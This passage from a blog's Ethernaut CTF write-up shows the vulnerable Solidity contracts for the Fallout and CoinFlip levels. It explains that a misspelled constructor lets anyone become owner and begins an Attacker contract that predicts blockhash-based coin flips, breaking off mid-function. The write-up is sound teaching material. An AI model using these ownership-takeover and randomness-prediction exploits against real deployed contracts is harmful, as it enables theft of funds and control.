<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Ethernaut Write Up Part 1 | Eki&#39;s blog</title>
    <meta name="generator" content="VuePress 1.9.5">
    <link rel="icon" href="/img/favicon.ico">
    <undefined></undefined>
    <link rel="alternate" type="application/rss+xml" href="https://blog.ieki.xyz/rss.xml" title="Eki&#39;s blog RSS Feed">
    <link rel="alternate" type="application/atom+xml" href="https://blog.ieki.xyz/feed.atom" title="Eki&#39;s blog Atom Feed">
    <link rel="alternate" type="application/json" href="https://blog.ieki.xyz/feed.json" title="Eki&#39;s blog JSON Feed">
    <meta name="description" content="网络空间安全技术博客">
    <meta name="keywords" content="CTF,Pentest,网络空间安全">
    <meta name="baidu-site-verification" content="7F55weZDDc">
    <meta name="theme-color" content="#11a8cd">
    
    <link rel="preload" href="/assets/css/0.styles.05e4719f.css" as="style"><link rel="preload" href="/assets/js/app.8153bfb8.js" as="script"><link rel="preload" href="/assets/js/2.236d623d.js" as="script"><link rel="preload" href="/assets/js/60.dfcbd8de.js" as="script"><link rel="prefetch" href="/assets/js/10.46edbeee.js"><link rel="prefetch" href="/assets/js/100.6c7b5950.js"><link rel="prefetch" href="/assets/js/11.767adcb8.js"><link rel="prefetch" href="/assets/js/12.512cfd28.js"><link rel="prefetch" href="/assets/js/13.3a1a8df2.js"><link rel="prefetch" href="/assets/js/14.9af53798.js"><link rel="prefetch" href="/assets/js/15.ec2fb3eb.js"><link rel="prefetch" href="/assets/js/16.2a2ab730.js"><link rel="prefetch" href="/assets/js/17.f68cb202.js"><link rel="prefetch" href="/assets/js/18.63691748.js"><link rel="prefetch" href="/assets/js/19.c42e067a.js"><link rel="prefetch" href="/assets/js/20.d572d5a9.js"><link rel="prefetch" href="/assets/js/21.2adaf23d.js"><link rel="prefetch" href="/assets/js/22.ec130e8f.js"><link rel="prefetch" href="/assets/js/23.91dff6b1.js"><link rel="prefetch" href="/assets/js/24.e99440a5.js"><link rel="prefetch" href="/assets/js/25.c058aace.js"><link rel="prefetch" href="/assets/js/26.64c96eb1.js"><link rel="prefetch" href="/assets/js/27.dc5608c6.js"><link rel="prefetch" href="/assets/js/28.6485ffc0.js"><link rel="prefetch" href="/assets/js/29.853384e7.js"><link rel="prefetch" href="/assets/js/3.18b28bc3.js"><link rel="prefetch" href="/assets/js/30.5e8757c8.js"><link rel="prefetch" href="/assets/js/31.f620c04c.js"><link rel="prefetch" href="/assets/js/32.0b35c345.js"><link rel="prefetch" href="/assets/js/33.643f4002.js"><link rel="prefetch" href="/assets/js/34.17bda2ac.js"><link rel="prefetch" href="/assets/js/35.3194ffeb.js"><link rel="prefetch" href="/assets/js/36.7a864c05.js"><link rel="prefetch" href="/assets/js/37.ded9d5a1.js"><link rel="prefetch" href="/assets/js/38.e886837c.js"><link rel="prefetch" href="/assets/js/39.6fbcf82c.js"><link rel="prefetch" href="/assets/js/4.aa35785a.js"><link rel="prefetch" href="/assets/js/40.042825c7.js"><link rel="prefetch" href="/assets/js/41.be0e220a.js"><link rel="prefetch" href="/assets/js/42.16c54959.js"><link rel="prefetch" href="/assets/js/43.15487375.js"><link rel="prefetch" href="/assets/js/44.1bc3c0c9.js"><link rel="prefetch" href="/assets/js/45.4f713272.js"><link rel="prefetch" href="/assets/js/46.e09111f6.js"><link rel="prefetch" href="/assets/js/47.36f7aeac.js"><link rel="prefetch" href="/assets/js/48.f34dbf5d.js"><link rel="prefetch" href="/assets/js/49.736656d6.js"><link rel="prefetch" href="/assets/js/5.bf7c6b0f.js"><link rel="prefetch" href="/assets/js/50.198eeffb.js"><link rel="prefetch" href="/assets/js/51.97647028.js"><link rel="prefetch" href="/assets/js/52.c52a4607.js"><link rel="prefetch" href="/assets/js/53.7c2edc1a.js"><link rel="prefetch" href="/assets/js/54.fffca202.js"><link rel="prefetch" href="/assets/js/55.5ae50670.js"><link rel="prefetch" href="/assets/js/56.495068e5.js"><link rel="prefetch" href="/assets/js/57.a87d7435.js"><link rel="prefetch" href="/assets/js/58.67aa347c.js"><link rel="prefetch" href="/assets/js/59.df8d3736.js"><link rel="prefetch" href="/assets/js/6.3a52ecd1.js"><link rel="prefetch" href="/assets/js/61.c190617e.js"><link rel="prefetch" href="/assets/js/62.4cebd179.js"><link rel="prefetch" href="/assets/js/63.27f549f4.js"><link rel="prefetch" href="/assets/js/64.aa783284.js"><link rel="prefetch" href="/assets/js/65.5c153c60.js"><link rel="prefetch" href="/assets/js/66.57abb67a.js"><link rel="prefetch" href="/assets/js/67.3e60853d.js"><link rel="prefetch" href="/assets/js/68.fafb9569.js"><link rel="prefetch" href="/assets/js/69.bb71fbbe.js"><link rel="prefetch" href="/assets/js/7.ec46daa9.js"><link rel="prefetch" href="/assets/js/70.55a74c83.js"><link rel="prefetch" href="/assets/js/71.6edff065.js"><link rel="prefetch" href="/assets/js/72.2272d6b4.js"><link rel="prefetch" href="/assets/js/73.84a336f4.js"><link rel="prefetch" href="/assets/js/74.743857b6.js"><link rel="prefetch" href="/assets/js/75.7afd7794.js"><link rel="prefetch" href="/assets/js/76.c69ff262.js"><link rel="prefetch" href="/assets/js/77.a3789c9d.js"><link rel="prefetch" href="/assets/js/78.0a082dca.js"><link rel="prefetch" href="/assets/js/79.ac794bd1.js"><link rel="prefetch" href="/assets/js/8.20733eb2.js"><link rel="prefetch" href="/assets/js/80.f346fded.js"><link rel="prefetch" href="/assets/js/81.1148a126.js"><link rel="prefetch" href="/assets/js/82.a0646f03.js"><link rel="prefetch" href="/assets/js/83.3f5285e3.js"><link rel="prefetch" href="/assets/js/84.0b41ad40.js"><link rel="prefetch" href="/assets/js/85.05acaff5.js"><link rel="prefetch" href="/assets/js/86.6332ed81.js"><link rel="prefetch" href="/assets/js/87.1e154849.js"><link rel="prefetch" href="/assets/js/88.ef9fe71b.js"><link rel="prefetch" href="/assets/js/89.644c6266.js"><link rel="prefetch" href="/assets/js/9.34ad444d.js"><link rel="prefetch" href="/assets/js/90.7a517ed7.js"><link rel="prefetch" href="/assets/js/91.724c1d33.js"><link rel="prefetch" href="/assets/js/92.c37e9d81.js"><link rel="prefetch" href="/assets/js/93.e6e1d6ba.js"><link rel="prefetch" href="/assets/js/94.bd88bff3.js"><link rel="prefetch" href="/assets/js/95.a64b5926.js"><link rel="prefetch" href="/assets/js/96.11700cb6.js"><link rel="prefetch" href="/assets/js/97.61fe23a4.js"><link rel="prefetch" href="/assets/js/98.0ae964e9.js"><link rel="prefetch" href="/assets/js/99.44a05c74.js">
    <link rel="stylesheet" href="/assets/css/0.styles.05e4719f.css">
  </head>
  <body class="theme-mode-light">
    <div id="app" data-server-rendered="true"><div class="theme-container sidebar-open have-rightmenu have-body-img"><header class="navbar blur"><div title="目录" class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/" class="home-link router-link-active"><img src="/img/EB-logo.png" alt="Eki's blog" class="logo"> <span class="site-name can-hide">Eki's blog</span></a> <div class="links"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><div class="nav-item"><a href="/" class="nav-link">Home</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="CTF" class="dropdown-title"><a href="/ctf/" class="link-title">CTF</a> <span class="title" style="display:none;">CTF</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><h4>Library</h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/ctf/php/" class="nav-link">PHP</a></li><li class="dropdown-subitem"><a href="/ctf/java/" class="nav-link">JAVA</a></li><li class="dropdown-subitem"><a href="/pages/f33ffd/" class="nav-link">Node</a></li><li class="dropdown-subitem"><a href="/pages/5939d7/" class="nav-link">Python</a></li></ul></li><li class="dropdown-item"><h4>Contest</h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/pages/f3f203/" class="nav-link">D3CTF 2021 Write Up</a></li><li class="dropdown-subitem"><a href="/pages/8c33ec/" class="nav-link">虎符CTF2021</a></li><li class="dropdown-subitem"><a href="/pages/06932d/" class="nav-link">2021 红帽 Web Write Up</a></li></ul></li><li class="dropdown-item"><h4>Problem Set</h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/ctf/ethernaut/" class="nav-link">Ethernaut Write Up</a></li></ul></li></ul></div></div><div class="nav-item"><a href="/pentest/" class="nav-link">Pentest</a></div><div class="nav-item"><a href="/develop/" class="nav-link">Develop</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="More" class="dropdown-title"><a href="/more/" class="link-title">More</a> <span class="title" style="display:none;">More</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/friends/" class="nav-link">Friends</a></li></ul></div></div><div class="nav-item"><a href="/about/" class="nav-link">About</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="Favorites" class="dropdown-title"><a href="/pages/beb6c0bd8a66cea6/" class="link-title">Favorites</a> <span class="title" style="display:none;">Favorites</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/pages/beb6c0bd8a66cea6/" class="nav-link">Website</a></li><li class="dropdown-item"><!----> <a href="/pages/eee83a9211a70f9d/" class="nav-link">Tools</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="Archives" class="dropdown-title"><a href="/archives/" class="link-title">Archives</a> <span class="title" style="display:none;">Archives</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/categories/" class="nav-link">Categories</a></li><li class="dropdown-item"><!----> <a href="/tags/" class="nav-link">Tags</a></li><li class="dropdown-item"><!----> <a href="/archives/" class="nav-link">Archives</a></li></ul></div></div> <a href="https://github.com/EkiXu/blog" target="_blank" rel="noopener noreferrer" class="repo-link">
    GitHub
    <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></nav></div></header> <div class="sidebar-mask"></div> <div class="sidebar-hover-trigger"></div> <aside class="sidebar" style="display:none;"><div class="blogger"><img src="https://cdn.jsdelivr.net/gh/EkiXu/pics/imgme.png"> <div class="blogger-info"><h3>Eki</h3> <span>Dreamer of Dreams</span></div></div> <nav class="nav-links"><div class="nav-item"><a href="/" class="nav-link">Home</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="CTF" class="dropdown-title"><a href="/ctf/" class="link-title">CTF</a> <span class="title" style="display:none;">CTF</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><h4>Library</h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/ctf/php/" class="nav-link">PHP</a></li><li class="dropdown-subitem"><a href="/ctf/java/" class="nav-link">JAVA</a></li><li class="dropdown-subitem"><a href="/pages/f33ffd/" class="nav-link">Node</a></li><li class="dropdown-subitem"><a href="/pages/5939d7/" class="nav-link">Python</a></li></ul></li><li class="dropdown-item"><h4>Contest</h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/pages/f3f203/" class="nav-link">D3CTF 2021 Write Up</a></li><li class="dropdown-subitem"><a href="/pages/8c33ec/" class="nav-link">虎符CTF2021</a></li><li class="dropdown-subitem"><a href="/pages/06932d/" class="nav-link">2021 红帽 Web Write Up</a></li></ul></li><li class="dropdown-item"><h4>Problem Set</h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/ctf/ethernaut/" class="nav-link">Ethernaut Write Up</a></li></ul></li></ul></div></div><div class="nav-item"><a href="/pentest/" class="nav-link">Pentest</a></div><div class="nav-item"><a href="/develop/" class="nav-link">Develop</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="More" class="dropdown-title"><a href="/more/" class="link-title">More</a> <span class="title" style="display:none;">More</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/friends/" class="nav-link">Friends</a></li></ul></div></div><div class="nav-item"><a href="/about/" class="nav-link">About</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="Favorites" class="dropdown-title"><a href="/pages/beb6c0bd8a66cea6/" class="link-title">Favorites</a> <span class="title" style="display:none;">Favorites</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/pages/beb6c0bd8a66cea6/" class="nav-link">Website</a></li><li class="dropdown-item"><!----> <a href="/pages/eee83a9211a70f9d/" class="nav-link">Tools</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="Archives" class="dropdown-title"><a href="/archives/" class="link-title">Archives</a> <span class="title" style="display:none;">Archives</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/categories/" class="nav-link">Categories</a></li><li class="dropdown-item"><!----> <a href="/tags/" class="nav-link">Tags</a></li><li class="dropdown-item"><!----> <a href="/archives/" class="nav-link">Archives</a></li></ul></div></div> <a href="https://github.com/EkiXu/blog" target="_blank" rel="noopener noreferrer" class="repo-link">
    GitHub
    <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></nav>  <ul class="sidebar-links"><li><a href="/ctf/ethernaut/" class="sidebar-link">Ethernaut Write Up</a></li><li><a href="/pages/17015a/" aria-current="page" class="active sidebar-link">Ethernaut Write Up Part 1</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header level2"><a href="/pages/17015a/#hello-ethernaut" class="sidebar-link">HELLO ETHERNAUT</a></li><li class="sidebar-sub-header level2"><a href="/pages/17015a/#fallback" class="sidebar-link">FALLBACK</a></li><li class="sidebar-sub-header level2"><a href="/pages/17015a/#fallout" class="sidebar-link">FALLOUT</a></li><li class="sidebar-sub-header level2"><a href="/pages/17015a/#coin-flip" class="sidebar-link">COIN FLIP</a></li><li class="sidebar-sub-header level2"><a href="/pages/17015a/#telephone" class="sidebar-link">Telephone</a></li><li class="sidebar-sub-header level2"><a href="/pages/17015a/#delegation" class="sidebar-link">Delegation</a></li><li class="sidebar-sub-header level2"><a href="/pages/17015a/#force" class="sidebar-link">Force</a></li><li class="sidebar-sub-header level2"><a href="/pages/17015a/#vault" class="sidebar-link">Vault</a></li><li class="sidebar-sub-header level2"><a href="/pages/17015a/#king" class="sidebar-link">King</a></li><li class="sidebar-sub-header level2"><a href="/pages/17015a/#re-entrancy" class="sidebar-link">Re-entrancy</a></li><li class="sidebar-sub-header level2"><a href="/pages/17015a/#elevator" class="sidebar-link">Elevator</a></li><li class="sidebar-sub-header level2"><a href="/pages/17015a/#privacy" class="sidebar-link">Privacy</a></li><li class="sidebar-sub-header level2"><a href="/pages/17015a/#gatekeepertwo" class="sidebar-link">GateKeeperTwo</a></li><li class="sidebar-sub-header level2"><a href="/pages/17015a/#naught-coin" class="sidebar-link">Naught Coin</a></li><li class="sidebar-sub-header level2"><a href="/pages/17015a/#magic-number" class="sidebar-link">Magic Number</a></li></ul></li></ul> </aside> <div><main class="page"><div class="theme-vdoing-wrapper "><div class="articleInfo-wrap" data-v-06225672><div class="articleInfo" data-v-06225672><ul class="breadcrumbs" data-v-06225672><li data-v-06225672><a href="/" title="首页" class="iconfont icon-home router-link-active" data-v-06225672></a></li> <li data-v-06225672><a href="/categories/?category=Ethernaut%20Write%20Up" title="分类" data-v-06225672>Ethernaut Write Up</a></li></ul> <div class="info" data-v-06225672><div title="作者" class="author iconfont icon-touxiang" data-v-06225672><a href="https://ieki.xyz" target="_blank" title="作者" class="beLink" data-v-06225672>Eki</a></div> <div title="创建时间" class="date iconfont icon-riqi" data-v-06225672><a href="javascript:;" data-v-06225672>2021-05-10</a></div> <!----></div></div></div> <!----> <div class="content-wrapper"><div class="right-menu-wrapper"><div class="right-menu-margin"><div class="right-menu-title">目录</div> <div class="right-menu-content"></div></div></div> <h1><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAB4AAAAeCAYAAAA7MK6iAAAAAXNSR0IArs4c6QAABKFJREFUSA3tVl1oFVcQnrMbrak3QUgkya1akpJYcrUtIqW1JvFBE9LiQ5v6JmJpolbMg32rVrhgoYK0QiMY6i9Y6EMaW5D+xFJaTYItIuK2Kr3+BJNwkxBj05sQY3b3nM6cs2dv9t7NT/vQJw/sndk5M/PNzJkzewGerP+pAmy+ON8lLzUJgA8ZYxYIYZmGYRnctDaWvJJAmTtfP1pvXsBCCPP8QFcCaRkZYACgDZFO4stNIcBCajEOlmmC9XpJ9bAGCaPaPmzPl32dvLSVu3BWCTQs0XQQ6g0DYgwLIoAZbBCdW/i+781o1VVlm/410mw4h06Y7bIPHNyWDyL4FHkX03Q8SrzNhZTZriieckWt7cL6MM85YcLpsi/7O9/iXFT6MswI0DmmpkSaJ0qLxFIm3+i1THHB3zmBH3PYx9CcykcLOeQVVa7QtdxTgQgEleX2AjHYfwA+2ddV77ruGoJUbhGDI09YSNXyMpUt5ylOzxgbUmtOp7NmbNt8v3arjTBfYELmLUV+M+nSawNNAUqpT3ClJWg5I3BLT+cGW/DXNGCa6tx1aakCGEigArTn4TDIPdrXXYKCZNrHLMCOEPvHBlLQ99s9eHB7EB6NTki73CVPQ2F5MSx/uRQixfmq7rK0wYD8w8E905bnPDfwoWs/rfv93NWN/ZfvwsLIU7A09gxECyISeGJkHAau98L97tuw7NXnoPyNF8FcYGLGKsOs0mN3OEyec9esGW/ZEl945dTP34wlR2FZVQWU1q0Cw8Tr7p+hgLLNL0FPxx/Q35mA8aEUrH6nCgwEl0tn7wUiZYJnNRh6DK4UH/k0lfyrsBKdPVv/AriGIQcEDQZ65LBAGe2Rzui9Ybjz7XUppz1/uKBbyVPGkN3ZAeC6hr0x7Nr38N5+EqkoOm17xpoqR9ohQF55ERSvr4Dkr3chNfC3DMzGJlNBElW8w9nsGQvhNGIzDkXzCg8cLK951xHsFBlTJspJNi3ZFIMF2AeDV3q8DNOB+YHi6QTrChDIWDBRi5U5f+ZMfJLu3ccrqxtdxk4SKH336LFxSmkqefwU5T8fhdSdQf9IVKD6aNiwI/hnmcAZ91isYMJIaCUCx9W098+LgruikeTqzqqxKPUwqJyCPJiyemVVZBOijDGjD38Os0jOiSPL1z3SPjXNANbiNPXAdzTfukjjuknNBbyz3nwgTd3AVFqUJ5hpHlq9MveLnWwttUfoygBmvVjuikxND3znrhsELnZk7k+OjIGxeNEkomyLVta0xxn+HZhjBc4YZ/AFjHjz9u3xRZl2BN4aq9nFwWh16IrQ1aHHEd3j1+4/dB9OtH4e29A2H1DyHQRmOSfQZ1Fy7MHBTGB6J/Djq6p3OxyO2cB+4Car7v/o3GXgfAkj23+x9ID1Teoamo/SXcbvSf2PX7Vc8DdCmE1vN9di+32P9/5YR3vLnhCVGUWBjEkr3yh4H8v9CzmsbdhzOKzsJKM90iFdaTMjRPhGVsakRvOaRidljo6H6G7j+ctrJpsP+4COhDIl0La2+FS4+5mlocBaXY5QnGZysIBYoeSsl5qQzrSj/cgNrfuEzlWBfwA+EjrZyWUvpAAAAABJRU5ErkJggg==">Ethernaut Write Up Part 1<!----></h1>  <div class="theme-vdoing-content content__default"><h1 id="ethernaut-write-up-part-1"><a href="#ethernaut-write-up-part-1" class="header-anchor">#</a> Ethernaut Write Up Part 1</h1> <h2 id="hello-ethernaut"><a href="#hello-ethernaut" class="header-anchor">#</a> HELLO ETHERNAUT</h2> <p>基本的交互操作</p> <p>打开F12跟着指引就行</p> <h2 id="fallback"><a href="#fallback" class="header-anchor">#</a> FALLBACK</h2> <p>大概就是满足条件就可以调用函数成为owner，所以打点钱就好了</p> <h2 id="fallout"><a href="#fallout" class="header-anchor">#</a> FALLOUT</h2> <p>Constructor 写错了</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>pragma solidity <span class="token operator">^</span><span class="token number">0.4</span><span class="token number">.18</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token string">'zeppelin-solidity/contracts/ownership/Ownable.sol'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token string">'openzeppelin-solidity/contracts/math/SafeMath.sol'</span><span class="token punctuation">;</span>

contract Fallout is Ownable <span class="token punctuation">{</span>
  
  using SafeMath <span class="token keyword">for</span> uint256<span class="token punctuation">;</span>
  <span class="token function">mapping</span> <span class="token punctuation">(</span><span class="token parameter">address</span> <span class="token operator">=&gt;</span> uint<span class="token punctuation">)</span> allocations<span class="token punctuation">;</span>

  <span class="token comment">/* constructor */</span>
  <span class="token keyword">function</span> <span class="token function">Fal1out</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> payable <span class="token punctuation">{</span><span class="token comment">//这里是l1 不是ll 导致我们可以调用这个函数成为owner</span>
    owner <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>
    allocations<span class="token punctuation">[</span>owner<span class="token punctuation">]</span> <span class="token operator">=</span> msg<span class="token punctuation">.</span>value<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token keyword">function</span> <span class="token function">allocate</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> payable <span class="token punctuation">{</span>
    allocations<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">=</span> allocations<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token keyword">function</span> <span class="token function">sendAllocation</span><span class="token punctuation">(</span><span class="token parameter">address allocator</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>
    <span class="token function">require</span><span class="token punctuation">(</span>allocations<span class="token punctuation">[</span>allocator<span class="token punctuation">]</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    allocator<span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span>allocations<span class="token punctuation">[</span>allocator<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token keyword">function</span> <span class="token function">collectAllocations</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> onlyOwner <span class="token punctuation">{</span>
    msg<span class="token punctuation">.</span>sender<span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>balance<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token keyword">function</span> <span class="token function">allocatorBalance</span><span class="token punctuation">(</span><span class="token parameter">address allocator</span><span class="token punctuation">)</span> <span class="token keyword">public</span> view <span class="token function">returns</span> <span class="token punctuation">(</span><span class="token parameter">uint</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> allocations<span class="token punctuation">[</span>allocator<span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br></div></div><h2 id="coin-flip"><a href="#coin-flip" class="header-anchor">#</a> COIN FLIP</h2> <div class="language-js line-numbers-mode"><pre class="language-js"><code>pragma solidity <span class="token operator">^</span><span class="token number">0.4</span><span class="token number">.18</span><span class="token punctuation">;</span>

contract CoinFlip <span class="token punctuation">{</span>
  uint256 <span class="token keyword">public</span> consecutiveWins<span class="token punctuation">;</span>
  uint256 lastHash<span class="token punctuation">;</span>
  uint256 <span class="token constant">FACTOR</span> <span class="token operator">=</span> <span class="token number">57896044618658097711785492504343953926634992332820282019728792003956564819968</span><span class="token punctuation">;</span>

  <span class="token keyword">function</span> <span class="token function">CoinFlip</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>
    consecutiveWins <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token keyword">function</span> <span class="token function">flip</span><span class="token punctuation">(</span><span class="token parameter">bool _guess</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token function">returns</span> <span class="token punctuation">(</span><span class="token parameter">bool</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    uint256 blockValue <span class="token operator">=</span> <span class="token function">uint256</span><span class="token punctuation">(</span>block<span class="token punctuation">.</span><span class="token function">blockhash</span><span class="token punctuation">(</span>block<span class="token punctuation">.</span>number<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>lastHash <span class="token operator">==</span> blockValue<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token function">revert</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    lastHash <span class="token operator">=</span> blockValue<span class="token punctuation">;</span>
    uint256 coinFlip <span class="token operator">=</span> <span class="token function">uint256</span><span class="token punctuation">(</span><span class="token function">uint256</span><span class="token punctuation">(</span>blockValue<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token constant">FACTOR</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    bool side <span class="token operator">=</span> coinFlip <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">?</span> <span class="token boolean">true</span> <span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>side <span class="token operator">==</span> _guess<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      consecutiveWins<span class="token operator">++</span><span class="token punctuation">;</span>
      <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
      consecutiveWins <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
      <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

contract Attacker <span class="token punctuation">{</span>
  CoinFlip fliphack<span class="token punctuation">;</span>
  uint256 <span class="token constant">FACTOR</span> <span class="token operator">=</span> <span class="token number">57896044618658097711785492504343953926634992332820282019728792003956564819968</span><span class="token punctuation">;</span>

  <span class="token keyword">function</span> <span class="token function">Attacker</span><span class="token punctuation">(</span><span class="token parameter">address target_address</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    fliphack <span class="token operator">=</span> <span class="token function">CoinFlip</span><span class="token punctuation">(</span>target_address<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token keyword">function</span> <span class="token function">hack</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>
